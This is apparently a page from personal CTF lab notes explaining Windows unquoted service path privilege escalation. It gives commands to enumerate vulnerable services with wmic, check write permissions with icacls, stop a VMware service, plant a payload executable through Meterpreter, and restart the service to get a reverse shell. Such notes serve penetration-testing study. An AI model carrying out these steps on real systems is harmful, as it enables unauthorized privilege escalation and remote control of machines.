---
layout: default
title: Unquoted Path
nav_order: 1
---

# Unquoted Path

---

We need to be able to confirm the following:

1. A service has an unquoted service path with a space in the path name
2. Our current user has permissions to write to a directory within the search path of the service
3. Our current user has permissions to start and stop that service

## WMIC

Use _wmic_ to search for all services and paths, specifically searching for unquoted paths

```bash
C:\> wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
```

We can then use _icacls_ to determine if we have write permissions to a directory

```bash
C:\> cd "C:\program Files\VMware\"
C:\> icacls "VMware Tools"
```

![icacls](../../../../assets/images/ctfs/proving_grounds/privesc/icacls.png)

Stop the service

```bash
C:\> sc stop VGAuthService
```

Then we upload our payload to the target directory.

```bash
# If Meterpreter shell
meterpreter > upload payload64.exe "C:\\program files\\Vmware\\Vmware Tools\\Vmware.exe"
```

Start the service and get the reverse shell

```bash
C:\> sc start VGAuthService
```

## sc (service control)

We can also use the "sc" (Service Control) command with "qc" (Show Config) option to query a specific service and manually check for an unquoted path.

```bash
C:\> sc qc CIJSRegister
```
